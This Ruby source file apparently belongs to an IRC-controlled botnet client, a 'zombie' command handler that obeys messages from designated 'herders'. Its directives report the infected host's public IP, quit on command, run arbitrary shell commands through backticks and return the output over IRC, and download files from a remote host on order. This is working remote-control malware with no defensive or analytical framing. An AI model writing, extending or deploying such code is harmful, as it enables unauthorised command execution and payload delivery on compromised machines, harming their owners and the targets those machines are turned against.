# noinspection RubyUnusedLocalVariable

require_relative 'GenericClientReceiveCommandHandler'
require_relative 'CommandFormatter'
require_relative 'filetransfer/FileTransferReceiverUtil'

class ZombieClientReceiveCommandHandler < GenericClientReceiveCommandHandler
  @FileTransferPort = 443

  def MESSAGE(client, creds, sender, params)
    if sender.include?('!~')
      senderNick = sender.split('!~').first
    else
      senderNick = sender.split('@').first
    end
    if creds.herders.include?(senderNick)
      if params[0].upcase == 'DIRECTIVE'
        if params[1].upcase == 'PING'
          DIRECTIVE_PING(client, creds)
        elsif params[1].upcase == 'KILL'
          DIRECTIVE_KILL(client, creds, params[2..-1]);
        elsif params[1].upcase == 'EXEC'
          DIRECTIVE_EXEC(client, creds, params[2..-1]);
        elsif params[1].upcase == 'TRANSFER'
          DIRECTIVE_TRANSFER(client, creds, params[2..-1]);
        end
      end
    end
  end

  def DIRECTIVE_PING(client, creds)
    puts 'PINGING'
    client.write(CommandFormatter.say(creds, 'PONG ' + open('http://whatismyip.akamai.com').read))
  end

  def DIRECTIVE_KILL(client, creds, params)
    if params != nil and doListenToUser(params[0],creds)
      puts 'KILLING'
      client.write("QUIT\n")
      raise RemoteQuitException
    end
  end

  def DIRECTIVE_EXEC(client,creds,params)
    if params!=nil and doListenToUser(params[0],creds)
      begin
        puts 'EXECUTING'
        results = `#{params[1..-1] * ' '}`.tr("\n",", ")[0..-2]
          client.write(CommandFormatter.say(creds,results))
      rescue
        client.write(CommandFormatter.say(creds,'Error Executing Command'))
      end
    end
  end

  def DIRECTIVE_TRANSFER(client,creds,params)
    puts "Downloading"
    ftru = FileTransferReceiverUtil.new
    puts params
    ftru.receiveAsync(params[1], params[2], params[4], DownloadCB.new(client, creds))
  end
end

class DownloadCB
  def initialize(client, creds)
    @client = client
    @creds = creds
  end

  def Run
    @client.write(CommandFormatter.say(@creds, "Download Complete"))
    puts "Done Downloading"
  end
end